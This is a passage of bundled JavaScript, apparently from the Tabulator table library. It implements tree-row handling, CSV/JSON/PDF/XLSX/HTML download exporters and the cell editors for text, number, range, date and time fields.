          config.branchEl.style.marginLeft = (config.branchEl.offsetWidth + config.branchEl.style.marginRight) * (config.index - 1) + config.index * this.indent + "px";
        }
      } else {
        if (this.table.rtl) {
          el.style.paddingRight = parseInt(window.getComputedStyle(el, null).getPropertyValue("padding-right")) + config.index * this.indent + "px";
        } else {
          el.style.paddingLeft = parseInt(window.getComputedStyle(el, null).getPropertyValue("padding-left")) + config.index * this.indent + "px";
        }
      }
    }
  }
  generateControlElement(row, el) {
    var config = row.modules.dataTree, oldControl = config.controlEl;
    el = el || row.getCells()[0].getElement();
    if (config.children !== false) {
      if (config.open) {
        config.controlEl = this.collapseEl.cloneNode(true);
        config.controlEl.addEventListener("click", (e2) => {
          e2.stopPropagation();
          this.collapseRow(row);
        });
      } else {
        config.controlEl = this.expandEl.cloneNode(true);
        config.controlEl.addEventListener("click", (e2) => {
          e2.stopPropagation();
          this.expandRow(row);
        });
      }
      config.controlEl.addEventListener("mousedown", (e2) => {
        e2.stopPropagation();
      });
      if (oldControl && oldControl.parentNode === el) {
        oldControl.parentNode.replaceChild(config.controlEl, oldControl);
      } else {
        el.insertBefore(config.controlEl, el.firstChild);
      }
    }
  }
  getRows(rows2) {
    var output = [];
    rows2.forEach((row, i2) => {
      var config, children;
      output.push(row);
      if (row instanceof Row) {
        row.create();
        config = row.modules.dataTree;
        if (!config.index && config.children !== false) {
          children = this.getChildren(row, false, true);
          children.forEach((child) => {
            child.create();
            output.push(child);
          });
        }
      }
    });
    return output;
  }
  getChildren(row, allChildren, sortOnly) {
    var config = row.modules.dataTree, children = [], output = [];
    if (config.children !== false && (config.open || allChildren)) {
      if (!Array.isArray(config.children)) {
        config.children = this.generateChildren(row);
      }
      if (this.table.modExists("filter") && this.table.options.dataTreeFilter) {
        children = this.table.modules.filter.filter(config.children);
      } else {
        children = config.children;
      }
      if (this.table.modExists("sort") && this.table.options.dataTreeSort) {
        this.table.modules.sort.sort(children, sortOnly);
      }
      children.forEach((child) => {
        output.push(child);
        var subChildren = this.getChildren(child, false, true);
        subChildren.forEach((sub) => {
          output.push(sub);
        });
      });
    }
    return output;
  }
  generateChildren(row) {
    var children = [];
    var childArray = row.getData()[this.field];
    if (!Array.isArray(childArray)) {
      childArray = [childArray];
    }
    childArray.forEach((childData) => {
      var childRow = new Row(childData || {}, this.table.rowManager);
      childRow.create();
      childRow.modules.dataTree.index = row.modules.dataTree.index + 1;
      childRow.modules.dataTree.parent = row;
      if (childRow.modules.dataTree.children) {
        childRow.modules.dataTree.open = this.startOpen(childRow.getComponent(), childRow.modules.dataTree.index);
      }
      children.push(childRow);
    });
    return children;
  }
  expandRow(row, silent) {
    var config = row.modules.dataTree;
    if (config.children !== false) {
      config.open = true;
      row.reinitialize();
      this.refreshData(true);
      this.dispatchExternal("dataTreeRowExpanded", row.getComponent(), row.modules.dataTree.index);
    }
  }
  collapseRow(row) {
    var config = row.modules.dataTree;
    if (config.children !== false) {
      config.open = false;
      row.reinitialize();
      this.refreshData(true);
      this.dispatchExternal("dataTreeRowCollapsed", row.getComponent(), row.modules.dataTree.index);
    }
  }
  toggleRow(row) {
    var config = row.modules.dataTree;
    if (config.children !== false) {
      if (config.open) {
        this.collapseRow(row);
      } else {
        this.expandRow(row);
      }
    }
  }
  isRowExpanded(row) {
    return row.modules.dataTree.open;
  }
  getTreeParent(row) {
    return row.modules.dataTree.parent ? row.modules.dataTree.parent.getComponent() : false;
  }
  getTreeParentRoot(row) {
    return row.modules.dataTree && row.modules.dataTree.parent ? this.getTreeParentRoot(row.modules.dataTree.parent) : row;
  }
  getFilteredTreeChildren(row) {
    var config = row.modules.dataTree, output = [], children;
    if (config.children) {
      if (!Array.isArray(config.children)) {
        config.children = this.generateChildren(row);
      }
      if (this.table.modExists("filter") && this.table.options.dataTreeFilter) {
        children = this.table.modules.filter.filter(config.children);
      } else {
        children = config.children;
      }
      children.forEach((childRow) => {
        if (childRow instanceof Row) {
          output.push(childRow);
        }
      });
    }
    return output;
  }
  rowDelete(row) {
    var parent = row.modules.dataTree.parent, childIndex;
    if (parent) {
      childIndex = this.findChildIndex(row, parent);
      if (childIndex !== false) {
        parent.data[this.field].splice(childIndex, 1);
      }
      if (!parent.data[this.field].length) {
        delete parent.data[this.field];
      }
      this.initializeRow(parent);
      this.layoutRow(parent);
    }
    this.refreshData(true);
  }
  addTreeChildRow(row, data, top2, index) {
    var childIndex = false;
    if (typeof data === "string") {
      data = JSON.parse(data);
    }
    if (!Array.isArray(row.data[this.field])) {
      row.data[this.field] = [];
      row.modules.dataTree.open = this.startOpen(row.getComponent(), row.modules.dataTree.index);
    }
    if (typeof index !== "undefined") {
      childIndex = this.findChildIndex(index, row);
      if (childIndex !== false) {
        row.data[this.field].splice(top2 ? childIndex : childIndex + 1, 0, data);
      }
    }
    if (childIndex === false) {
      if (top2) {
        row.data[this.field].unshift(data);
      } else {
        row.data[this.field].push(data);
      }
    }
    this.initializeRow(row);
    this.layoutRow(row);
    this.refreshData(true);
  }
  findChildIndex(subject, parent) {
    var match2 = false;
    if (typeof subject == "object") {
      if (subject instanceof Row) {
        match2 = subject.data;
      } else if (subject instanceof RowComponent) {
        match2 = subject._getSelf().data;
      } else if (typeof HTMLElement !== "undefined" && subject instanceof HTMLElement) {
        if (parent.modules.dataTree) {
          match2 = parent.modules.dataTree.children.find((childRow) => {
            return childRow instanceof Row ? childRow.element === subject : false;
          });
          if (match2) {
            match2 = match2.data;
          }
        }
      } else if (subject === null) {
        match2 = false;
      }
    } else if (typeof subject == "undefined") {
      match2 = false;
    } else {
      match2 = parent.data[this.field].find((row) => {
        return row.data[this.table.options.index] == subject;
      });
    }
    if (match2) {
      if (Array.isArray(parent.data[this.field])) {
        match2 = parent.data[this.field].indexOf(match2);
      }
      if (match2 == -1) {
        match2 = false;
      }
    }
    return match2;
  }
  getTreeChildren(row, component, recurse) {
    var config = row.modules.dataTree, output = [];
    if (config && config.children) {
      if (!Array.isArray(config.children)) {
        config.children = this.generateChildren(row);
      }
      config.children.forEach((childRow) => {
        if (childRow instanceof Row) {
          output.push(component ? childRow.getComponent() : childRow);
          if (recurse) {
            this.getTreeChildren(childRow, component, recurse).forEach((child) => {
              output.push(child);
            });
          }
        }
      });
    }
    return output;
  }
  getChildField() {
    return this.field;
  }
  redrawNeeded(data) {
    return (this.field ? typeof data[this.field] !== "undefined" : false) || (this.elementField ? typeof data[this.elementField] !== "undefined" : false);
  }
}
function csv$1(list2, options = {}, setFileContents) {
  var delimiter = options.delimiter ? options.delimiter : ",", fileContents = [], headers = [];
  list2.forEach((row) => {
    var item = [];
    switch (row.type) {
      case "group":
        console.warn("Download Warning - CSV downloader cannot process row groups");
        break;
      case "calc":
        console.warn("Download Warning - CSV downloader cannot process column calculations");
        break;
      case "header":
        row.columns.forEach((col, i2) => {
          if (col && col.depth === 1) {
            headers[i2] = typeof col.value == "undefined" || col.value === null ? "" : '"' + String(col.value).split('"').join('""') + '"';
          }
        });
        break;
      case "row":
        row.columns.forEach((col) => {
          if (col) {
            switch (typeof col.value) {
              case "object":
                col.value = col.value !== null ? JSON.stringify(col.value) : "";
                break;
              case "undefined":
                col.value = "";
                break;
            }
            item.push('"' + String(col.value).split('"').join('""') + '"');
          }
        });
        fileContents.push(item.join(delimiter));
        break;
    }
  });
  if (headers.length) {
    fileContents.unshift(headers.join(delimiter));
  }
  fileContents = fileContents.join("\n");
  if (options.bom) {
    fileContents = "\uFEFF" + fileContents;
  }
  setFileContents(fileContents, "text/csv");
}
function json$2(list2, options, setFileContents) {
  var fileContents = [];
  list2.forEach((row) => {
    var item = {};
    switch (row.type) {
      case "header":
        break;
      case "group":
        console.warn("Download Warning - JSON downloader cannot process row groups");
        break;
      case "calc":
        console.warn("Download Warning - JSON downloader cannot process column calculations");
        break;
      case "row":
        row.columns.forEach((col) => {
          if (col) {
            item[col.component.getTitleDownload() || col.component.getField()] = col.value;
          }
        });
        fileContents.push(item);
        break;
    }
  });
  fileContents = JSON.stringify(fileContents, null, "	");
  setFileContents(fileContents, "application/json");
}
function pdf(list2, options = {}, setFileContents) {
  var header = [], body = [], autoTableParams = {}, rowGroupStyles = options.rowGroupStyles || {
    fontStyle: "bold",
    fontSize: 12,
    cellPadding: 6,
    fillColor: 220
  }, rowCalcStyles = options.rowCalcStyles || {
    fontStyle: "bold",
    fontSize: 10,
    cellPadding: 4,
    fillColor: 232
  }, jsPDFParams = options.jsPDF || {}, title = options.title ? options.title : "", jspdfLib, doc;
  if (!jsPDFParams.orientation) {
    jsPDFParams.orientation = options.orientation || "landscape";
  }
  if (!jsPDFParams.unit) {
    jsPDFParams.unit = "pt";
  }
  list2.forEach((row) => {
    switch (row.type) {
      case "header":
        header.push(parseRow(row));
        break;
      case "group":
        body.push(parseRow(row, rowGroupStyles));
        break;
      case "calc":
        body.push(parseRow(row, rowCalcStyles));
        break;
      case "row":
        body.push(parseRow(row));
        break;
    }
  });
  function parseRow(row, styles) {
    var rowData = [];
    row.columns.forEach((col) => {
      var cell;
      if (col) {
        switch (typeof col.value) {
          case "object":
            col.value = col.value !== null ? JSON.stringify(col.value) : "";
            break;
          case "undefined":
            col.value = "";
            break;
        }
        cell = {
          content: col.value,
          colSpan: col.width,
          rowSpan: col.height
        };
        if (styles) {
          cell.styles = styles;
        }
        rowData.push(cell);
      }
    });
    return rowData;
  }
  jspdfLib = this.dependencyRegistry.lookup("jspdf", "jsPDF");
  doc = new jspdfLib(jsPDFParams);
  if (options.autoTable) {
    if (typeof options.autoTable === "function") {
      autoTableParams = options.autoTable(doc) || {};
    } else {
      autoTableParams = options.autoTable;
    }
  }
  if (title) {
    autoTableParams.didDrawPage = function(data) {
      doc.text(title, 40, 30);
    };
  }
  autoTableParams.head = header;
  autoTableParams.body = body;
  doc.autoTable(autoTableParams);
  if (options.documentProcessing) {
    options.documentProcessing(doc);
  }
  setFileContents(doc.output("arraybuffer"), "application/pdf");
}
function xlsx$1(list2, options, setFileContents) {
  var self = this, sheetName = options.sheetName || "Sheet1", XLSXLib = this.dependencyRegistry.lookup("XLSX"), workbook = XLSXLib.utils.book_new(), tableFeatures = new CoreFeature(this), compression = "compress" in options ? options.compress : true, writeOptions = options.writeOptions || { bookType: "xlsx", bookSST: true, compression }, output;
  writeOptions.type = "binary";
  workbook.SheetNames = [];
  workbook.Sheets = {};
  function generateSheet() {
    var rows2 = [], merges = [], worksheet = {}, range2 = { s: { c: 0, r: 0 }, e: { c: list2[0] ? list2[0].columns.reduce((a, b) => a + (b && b.width ? b.width : 1), 0) : 0, r: list2.length } };
    list2.forEach((row, i2) => {
      var rowData = [];
      row.columns.forEach(function(col, j) {
        if (col) {
          rowData.push(!(col.value instanceof Date) && typeof col.value === "object" ? JSON.stringify(col.value) : col.value);
          if (col.width > 1 || col.height > -1) {
            if (col.height > 1 || col.width > 1) {
              merges.push({ s: { r: i2, c: j }, e: { r: i2 + col.height - 1, c: j + col.width - 1 } });
            }
          }
        } else {
          rowData.push("");
        }
      });
      rows2.push(rowData);
    });
    XLSXLib.utils.sheet_add_aoa(worksheet, rows2);
    worksheet["!ref"] = XLSXLib.utils.encode_range(range2);
    if (merges.length) {
      worksheet["!merges"] = merges;
    }
    return worksheet;
  }
  if (options.sheetOnly) {
    setFileContents(generateSheet());
    return;
  }
  if (options.sheets) {
    for (var sheet in options.sheets) {
      if (options.sheets[sheet] === true) {
        workbook.SheetNames.push(sheet);
        workbook.Sheets[sheet] = generateSheet();
      } else {
        workbook.SheetNames.push(sheet);
        tableFeatures.commsSend(options.sheets[sheet], "download", "intercept", {
          type: "xlsx",
          options: { sheetOnly: true },
          active: self.active,
          intercept: function(data) {
            workbook.Sheets[sheet] = data;
          }
        });
      }
    }
  } else {
    workbook.SheetNames.push(sheetName);
    workbook.Sheets[sheetName] = generateSheet();
  }
  if (options.documentProcessing) {
    workbook = options.documentProcessing(workbook);
  }
  function s2ab(s2) {
    var buf = new ArrayBuffer(s2.length);
    var view = new Uint8Array(buf);
    for (var i2 = 0; i2 != s2.length; ++i2) view[i2] = s2.charCodeAt(i2) & 255;
    return buf;
  }
  output = XLSXLib.write(workbook, writeOptions);
  setFileContents(s2ab(output), "application/octet-stream");
}
function html$1(list2, options, setFileContents) {
  if (this.modExists("export", true)) {
    setFileContents(this.modules.export.generateHTMLTable(list2), "text/html");
  }
}
function jsonLines(list2, options, setFileContents) {
  const fileContents = [];
  list2.forEach((row) => {
    const item = {};
    switch (row.type) {
      case "header":
        break;
      case "group":
        console.warn("Download Warning - JSON downloader cannot process row groups");
        break;
      case "calc":
        console.warn("Download Warning - JSON downloader cannot process column calculations");
        break;
      case "row":
        row.columns.forEach((col) => {
          if (col) {
            item[col.component.getTitleDownload() || col.component.getField()] = col.value;
          }
        });
        fileContents.push(JSON.stringify(item));
        break;
    }
  });
  setFileContents(fileContents.join("\n"), "application/x-ndjson");
}
var defaultDownloaders = {
  csv: csv$1,
  json: json$2,
  jsonLines,
  pdf,
  xlsx: xlsx$1,
  html: html$1
};
class Download extends Module {
  static moduleName = "download";
  //load defaults
  static downloaders = defaultDownloaders;
  constructor(table) {
    super(table);
    this.registerTableOption("downloadEncoder", function(data, mimeType) {
      return new Blob([data], { type: mimeType });
    });
    this.registerTableOption("downloadConfig", {});
    this.registerTableOption("downloadRowRange", "active");
    this.registerColumnOption("download");
    this.registerColumnOption("titleDownload");
  }
  initialize() {
    this.deprecatedOptionsCheck();
    this.registerTableFunction("download", this.download.bind(this));
    this.registerTableFunction("downloadToTab", this.downloadToTab.bind(this));
  }
  deprecatedOptionsCheck() {
  }
  ///////////////////////////////////
  ///////// Table Functions /////////
  ///////////////////////////////////
  downloadToTab(type, filename, options, active) {
    this.download(type, filename, options, active, true);
  }
  ///////////////////////////////////
  ///////// Internal Logic //////////
  ///////////////////////////////////
  //trigger file download
  download(type, filename, options, range2, interceptCallback) {
    var downloadFunc = false;
    function buildLink(data, mime) {
      if (interceptCallback) {
        if (interceptCallback === true) {
          this.triggerDownload(data, mime, type, filename, true);
        } else {
          interceptCallback(data);
        }
      } else {
        this.triggerDownload(data, mime, type, filename);
      }
    }
    if (typeof type == "function") {
      downloadFunc = type;
    } else {
      if (Download.downloaders[type]) {
        downloadFunc = Download.downloaders[type];
      } else {
        console.warn("Download Error - No such download type found: ", type);
      }
    }
    if (downloadFunc) {
      var list2 = this.generateExportList(range2);
      downloadFunc.call(this.table, list2, options || {}, buildLink.bind(this));
    }
  }
  generateExportList(range2) {
    var list2 = this.table.modules.export.generateExportList(this.table.options.downloadConfig, false, range2 || this.table.options.downloadRowRange, "download");
    var groupHeader = this.table.options.groupHeaderDownload;
    if (groupHeader && !Array.isArray(groupHeader)) {
      groupHeader = [groupHeader];
    }
    list2.forEach((row) => {
      var group;
      if (row.type === "group") {
        group = row.columns[0];
        if (groupHeader && groupHeader[row.indent]) {
          group.value = groupHeader[row.indent](group.value, row.component._group.getRowCount(), row.component._group.getData(), row.component);
        }
      }
    });
    return list2;
  }
  triggerDownload(data, mime, type, filename, newTab) {
    var element = document.createElement("a"), blob = this.table.options.downloadEncoder(data, mime);
    if (blob) {
      if (newTab) {
        window.open(window.URL.createObjectURL(blob));
      } else {
        filename = filename || "Tabulator." + (typeof type === "function" ? "txt" : type);
        if (navigator.msSaveOrOpenBlob) {
          navigator.msSaveOrOpenBlob(blob, filename);
        } else {
          element.setAttribute("href", window.URL.createObjectURL(blob));
          element.setAttribute("download", filename);
          element.style.display = "none";
          document.body.appendChild(element);
          element.click();
          document.body.removeChild(element);
        }
      }
      this.dispatchExternal("downloadComplete");
    }
  }
  commsReceived(table, action, data) {
    switch (action) {
      case "intercept":
        this.download(data.type, "", data.options, data.active, data.intercept);
        break;
    }
  }
}
function maskInput(el, options) {
  var mask = options.mask, maskLetter = typeof options.maskLetterChar !== "undefined" ? options.maskLetterChar : "A", maskNumber = typeof options.maskNumberChar !== "undefined" ? options.maskNumberChar : "9", maskWildcard = typeof options.maskWildcardChar !== "undefined" ? options.maskWildcardChar : "*";
  function fillSymbols(index) {
    var symbol = mask[index];
    if (typeof symbol !== "undefined" && symbol !== maskWildcard && symbol !== maskLetter && symbol !== maskNumber) {
      el.value = el.value + "" + symbol;
      fillSymbols(index + 1);
    }
  }
  el.addEventListener("keydown", (e2) => {
    var index = el.value.length, char = e2.key;
    if (e2.keyCode > 46 && !e2.ctrlKey && !e2.metaKey) {
      if (index >= mask.length) {
        e2.preventDefault();
        e2.stopPropagation();
        return false;
      } else {
        switch (mask[index]) {
          case maskLetter:
            if (char.toUpperCase() == char.toLowerCase()) {
              e2.preventDefault();
              e2.stopPropagation();
              return false;
            }
            break;
          case maskNumber:
            if (isNaN(char)) {
              e2.preventDefault();
              e2.stopPropagation();
              return false;
            }
            break;
          case maskWildcard:
            break;
          default:
            if (char !== mask[index]) {
              e2.preventDefault();
              e2.stopPropagation();
              return false;
            }
        }
      }
    }
    return;
  });
  el.addEventListener("keyup", (e2) => {
    if (e2.keyCode > 46) {
      if (options.maskAutoFill) {
        fillSymbols(el.value.length);
      }
    }
  });
  if (!el.placeholder) {
    el.placeholder = mask;
  }
  if (options.maskAutoFill) {
    fillSymbols(el.value.length);
  }
}
function input(cell, onRendered, success, cancel2, editorParams) {
  var cellValue = cell.getValue(), input2 = document.createElement("input");
  input2.setAttribute("type", editorParams.search ? "search" : "text");
  input2.style.padding = "4px";
  input2.style.width = "100%";
  input2.style.boxSizing = "border-box";
  if (editorParams.elementAttributes && typeof editorParams.elementAttributes == "object") {
    for (let key in editorParams.elementAttributes) {
      if (key.charAt(0) == "+") {
        key = key.slice(1);
        input2.setAttribute(key, input2.getAttribute(key) + editorParams.elementAttributes["+" + key]);
      } else {
        input2.setAttribute(key, editorParams.elementAttributes[key]);
      }
    }
  }
  input2.value = typeof cellValue !== "undefined" ? cellValue : "";
  onRendered(function() {
    if (cell.getType() === "cell") {
      input2.focus({ preventScroll: true });
      input2.style.height = "100%";
      if (editorParams.selectContents) {
        input2.select();
      }
    }
  });
  function onChange(e2) {
    if ((cellValue === null || typeof cellValue === "undefined") && input2.value !== "" || input2.value !== cellValue) {
      if (success(input2.value)) {
        cellValue = input2.value;
      }
    } else {
      cancel2();
    }
  }
  input2.addEventListener("change", onChange);
  input2.addEventListener("blur", onChange);
  input2.addEventListener("keydown", function(e2) {
    switch (e2.keyCode) {
      case 13:
        onChange();
        break;
      case 27:
        cancel2();
        break;
      case 35:
      case 36:
        e2.stopPropagation();
        break;
    }
  });
  if (editorParams.mask) {
    maskInput(input2, editorParams);
  }
  return input2;
}
function textarea$1(cell, onRendered, success, cancel2, editorParams) {
  var cellValue = cell.getValue(), vertNav = editorParams.verticalNavigation || "hybrid", value = String(cellValue !== null && typeof cellValue !== "undefined" ? cellValue : ""), input2 = document.createElement("textarea"), scrollHeight = 0;
  input2.style.display = "block";
  input2.style.padding = "2px";
  input2.style.height = "100%";
  input2.style.width = "100%";
  input2.style.boxSizing = "border-box";
  input2.style.whiteSpace = "pre-wrap";
  input2.style.resize = "none";
  if (editorParams.elementAttributes && typeof editorParams.elementAttributes == "object") {
    for (let key in editorParams.elementAttributes) {
      if (key.charAt(0) == "+") {
        key = key.slice(1);
        input2.setAttribute(key, input2.getAttribute(key) + editorParams.elementAttributes["+" + key]);
      } else {
        input2.setAttribute(key, editorParams.elementAttributes[key]);
      }
    }
  }
  input2.value = value;
  onRendered(function() {
    if (cell.getType() === "cell") {
      input2.focus({ preventScroll: true });
      input2.style.height = "100%";
      input2.scrollHeight;
      input2.style.height = input2.scrollHeight + "px";
      cell.getRow().normalizeHeight();
      if (editorParams.selectContents) {
        input2.select();
      }
    }
  });
  function onChange(e2) {
    if ((cellValue === null || typeof cellValue === "undefined") && input2.value !== "" || input2.value !== cellValue) {
      if (success(input2.value)) {
        cellValue = input2.value;
      }
      setTimeout(function() {
        cell.getRow().normalizeHeight();
      }, 300);
    } else {
      cancel2();
    }
  }
  input2.addEventListener("change", onChange);
  input2.addEventListener("blur", onChange);
  input2.addEventListener("keyup", function() {
    input2.style.height = "";
    var heightNow = input2.scrollHeight;
    input2.style.height = heightNow + "px";
    if (heightNow != scrollHeight) {
      scrollHeight = heightNow;
      cell.getRow().normalizeHeight();
    }
  });
  input2.addEventListener("keydown", function(e2) {
    switch (e2.keyCode) {
      case 13:
        if (e2.shiftKey && editorParams.shiftEnterSubmit) {
          onChange();
        }
        break;
      case 27:
        cancel2();
        break;
      case 38:
        if (vertNav == "editor" || vertNav == "hybrid" && input2.selectionStart) {
          e2.stopImmediatePropagation();
          e2.stopPropagation();
        }
        break;
      case 40:
        if (vertNav == "editor" || vertNav == "hybrid" && input2.selectionStart !== input2.value.length) {
          e2.stopImmediatePropagation();
          e2.stopPropagation();
        }
        break;
      case 35:
      case 36:
        e2.stopPropagation();
        break;
    }
  });
  if (editorParams.mask) {
    maskInput(input2, editorParams);
  }
  return input2;
}
function number$1(cell, onRendered, success, cancel2, editorParams) {
  var cellValue = cell.getValue(), vertNav = editorParams.verticalNavigation || "editor", input2 = document.createElement("input");
  input2.setAttribute("type", "number");
  if (typeof editorParams.max != "undefined") {
    input2.setAttribute("max", editorParams.max);
  }
  if (typeof editorParams.min != "undefined") {
    input2.setAttribute("min", editorParams.min);
  }
  if (typeof editorParams.step != "undefined") {
    input2.setAttribute("step", editorParams.step);
  }
  input2.style.padding = "4px";
  input2.style.width = "100%";
  input2.style.boxSizing = "border-box";
  if (editorParams.elementAttributes && typeof editorParams.elementAttributes == "object") {
    for (let key in editorParams.elementAttributes) {
      if (key.charAt(0) == "+") {
        key = key.slice(1);
        input2.setAttribute(key, input2.getAttribute(key) + editorParams.elementAttributes["+" + key]);
      } else {
        input2.setAttribute(key, editorParams.elementAttributes[key]);
      }
    }
  }
  input2.value = cellValue;
  var blurFunc = function(e2) {
    onChange();
  };
  onRendered(function() {
    if (cell.getType() === "cell") {
      input2.removeEventListener("blur", blurFunc);
      input2.focus({ preventScroll: true });
      input2.style.height = "100%";
      input2.addEventListener("blur", blurFunc);
      if (editorParams.selectContents) {
        input2.select();
      }
    }
  });
  function onChange() {
    var value = input2.value;
    if (!isNaN(value) && value !== "") {
      value = Number(value);
    }
    if (value !== cellValue) {
      if (success(value)) {
        cellValue = value;
      }
    } else {
      cancel2();
    }
  }
  input2.addEventListener("keydown", function(e2) {
    switch (e2.keyCode) {
      case 13:
        onChange();
        break;
      case 27:
        cancel2();
        break;
      case 38:
      case 40:
        if (vertNav == "editor") {
          e2.stopImmediatePropagation();
          e2.stopPropagation();
        }
        break;
      case 35:
      case 36:
        e2.stopPropagation();
        break;
    }
  });
  if (editorParams.mask) {
    maskInput(input2, editorParams);
  }
  return input2;
}
function range(cell, onRendered, success, cancel2, editorParams) {
  var cellValue = cell.getValue(), input2 = document.createElement("input");
  input2.setAttribute("type", "range");
  if (typeof editorParams.max != "undefined") {
    input2.setAttribute("max", editorParams.max);
  }
  if (typeof editorParams.min != "undefined") {
    input2.setAttribute("min", editorParams.min);
  }
  if (typeof editorParams.step != "undefined") {
    input2.setAttribute("step", editorParams.step);
  }
  input2.style.padding = "4px";
  input2.style.width = "100%";
  input2.style.boxSizing = "border-box";
  if (editorParams.elementAttributes && typeof editorParams.elementAttributes == "object") {
    for (let key in editorParams.elementAttributes) {
      if (key.charAt(0) == "+") {
        key = key.slice(1);
        input2.setAttribute(key, input2.getAttribute(key) + editorParams.elementAttributes["+" + key]);
      } else {
        input2.setAttribute(key, editorParams.elementAttributes[key]);
      }
    }
  }
  input2.value = cellValue;
  onRendered(function() {
    if (cell.getType() === "cell") {
      input2.focus({ preventScroll: true });
      input2.style.height = "100%";
    }
  });
  function onChange() {
    var value = input2.value;
    if (!isNaN(value) && value !== "") {
      value = Number(value);
    }
    if (value != cellValue) {
      if (success(value)) {
        cellValue = value;
      }
    } else {
      cancel2();
    }
  }
  input2.addEventListener("blur", function(e2) {
    onChange();
  });
  input2.addEventListener("keydown", function(e2) {
    switch (e2.keyCode) {
      case 13:
        onChange();
        break;
      case 27:
        cancel2();
        break;
    }
  });
  return input2;
}
function date$1$1(cell, onRendered, success, cancel2, editorParams) {
  var inputFormat = editorParams.format, vertNav = editorParams.verticalNavigation || "editor", DT = inputFormat ? window.DateTime || luxon.DateTime : null;
  var cellValue = cell.getValue(), input2 = document.createElement("input");
  function convertDate(value) {
    var newDatetime;
    if (DT.isDateTime(value)) {
      newDatetime = value;
    } else if (inputFormat === "iso") {
      newDatetime = DT.fromISO(String(value));
    } else {
      newDatetime = DT.fromFormat(String(value), inputFormat);
    }
    return newDatetime.toFormat("yyyy-MM-dd");
  }
  input2.type = "date";
  input2.style.padding = "4px";
  input2.style.width = "100%";
  input2.style.boxSizing = "border-box";
  if (editorParams.max) {
    input2.setAttribute("max", inputFormat ? convertDate(editorParams.max) : editorParams.max);
  }
  if (editorParams.min) {
    input2.setAttribute("min", inputFormat ? convertDate(editorParams.min) : editorParams.min);
  }
  if (editorParams.elementAttributes && typeof editorParams.elementAttributes == "object") {
    for (let key in editorParams.elementAttributes) {
      if (key.charAt(0) == "+") {
        key = key.slice(1);
        input2.setAttribute(key, input2.getAttribute(key) + editorParams.elementAttributes["+" + key]);
      } else {
        input2.setAttribute(key, editorParams.elementAttributes[key]);
      }
    }
  }
  cellValue = typeof cellValue !== "undefined" ? cellValue : "";
  if (inputFormat) {
    if (DT) {
      cellValue = convertDate(cellValue);
    } else {
      console.error("Editor Error - 'date' editor 'format' param is dependant on luxon.js");
    }
  }
  input2.value = cellValue;
  onRendered(function() {
    if (cell.getType() === "cell") {
      input2.focus({ preventScroll: true });
      input2.style.height = "100%";
      if (editorParams.selectContents) {
        input2.select();
      }
    }
  });
  function onChange() {
    var value = input2.value, luxDate;
    if ((cellValue === null || typeof cellValue === "undefined") && value !== "" || value !== cellValue) {
      if (value && inputFormat) {
        luxDate = DT.fromFormat(String(value), "yyyy-MM-dd");
        switch (inputFormat) {
          case true:
            value = luxDate;
            break;
          case "iso":
            value = luxDate.toISO();
            break;
          default:
            value = luxDate.toFormat(inputFormat);
        }
      }
      if (success(value)) {
        cellValue = input2.value;
      }
    } else {
      cancel2();
    }
  }
  input2.addEventListener("blur", function(e2) {
    if (e2.relatedTarget || e2.rangeParent || e2.explicitOriginalTarget !== input2) {
      onChange();
    }
  });
  input2.addEventListener("keydown", function(e2) {
    switch (e2.keyCode) {
      case 13:
        onChange();
        break;
      case 27:
        cancel2();
        break;
      case 35:
      case 36:
        e2.stopPropagation();
        break;
      case 38:
      case 40:
        if (vertNav == "editor") {
          e2.stopImmediatePropagation();
          e2.stopPropagation();
        }
        break;
    }
  });
  return input2;
}
function time$1(cell, onRendered, success, cancel2, editorParams) {
  var inputFormat = editorParams.format, vertNav = editorParams.verticalNavigation || "editor", DT = inputFormat ? window.DateTime || luxon.DateTime : null, newDatetime;
  var cellValue = cell.getValue(), input2 = document.createElement("input");
  input2.type = "time";
  input2.style.padding = "4px";
  input2.style.width = "100%";
  input2.style.boxSizing = "border-box";
  if (editorParams.elementAttributes && typeof editorParams.elementAttributes == "object") {
    for (let key in editorParams.elementAttributes) {
      if (key.charAt(0) == "+") {
        key = key.slice(1);
        input2.setAttribute(key, input2.getAttribute(key) + editorParams.elementAttributes["+" + key]);
      } else {
        input2.setAttribute(key, editorParams.elementAttributes[key]);
      }
    }
  }
  cellValue = typeof cellValue !== "undefined" ? cellValue : "";
  if (inputFormat) {
    if (DT) {
      if (DT.isDateTime(cellValue)) {
        newDatetime = cellValue;
      } else if (inputFormat === "iso") {
        newDatetime = DT.fromISO(String(cellValue));
      } else {
        newDatetime = DT.fromFormat(String(cellValue), inputFormat);
      }
      cellValue = newDatetime.toFormat("HH:mm");
    } else {
      console.error("Editor Error - 'date' editor 'format' param is dependant on luxon.js");
    }
  }
  input2.value = cellValue;
  onRendered(function() {
    if (cell.getType() == "cell") {
      input2.focus({ preventScroll: true });
      input2.style.height = "100%";
      if (editorParams.selectContents) {
        input2.select();
      }
    }
  });
  function onChange() {
    var value = input2.value, luxTime;
    if ((cellValue === null || typeof cellValue === "undefined") && value !== "" || value !== cellValue) {
      if (value && inputFormat) {
        luxTime = DT.fromFormat(String(value), "hh:mm");
        switch (inputFormat) {
          case true:
            value = luxTime;
            break;
          case "iso":
            value = luxTime.toISO();
            break;
          default:
            value = luxTime.toFormat(inputFormat);
        }
      }
      if (success(value)) {
        cellValue = input2.value;
      }
    } else {
      cancel2();
    }
  }
  input2.addEventListener("blur", function(e2) {
    if (e2.relatedTarget || e2.rangeParent || e2.explicitOriginalTarget !== input2) {
      onChange();
    }
  });
  input2.addEventListener("keydown", function(e2) {
    switch (e2.keyCode) {
      case 13:
        onChange();
        break;
      case 27:
        cancel2();
        break;
      case 35:
      case 36:
        e2.stopPropagation();
        break;
      case 38:
      case 40:
        if (vertNav == "editor") {
          e2.stopImmediatePropagation();
          e2.stopPropagation();
        }
        break;
    }
  });
  return input2;
}
function datetime$2(cell, onRendered, success, cancel2, editorParams) {
  var inputFormat = editorParams.format, vertNav = editorParams.verticalNavigation || "editor", DT = inputFormat ? this.table.dependencyRegistry.lookup(["luxon", "DateTime"], "DateTime") : null, newDatetime;
  var cellValue = cell.getValue(), input2 = document.createElement("input");
  input2.type = "datetime-local";
  input2.style.padding = "4px";
  input2.style.width = "100%";
  input2.style.boxSizing = "border-box";
  if (editorParams.elementAttributes && typeof editorParams.elementAttributes == "object") {
    for (let key in editorParams.elementAttributes) {
      if (key.charAt(0) == "+") {
        key = key.slice(1);
        input2.setAttribute(key, input2.getAttribute(key) + editorParams.elementAttributes["+" + key]);
      } else {
        input2.setAttribute(key, editorParams.elementAttributes[key]);
      }
    }
  }
  cellValue = typeof cellValue !== "undefined" ? cellValue : "";
  if (inputFormat) {
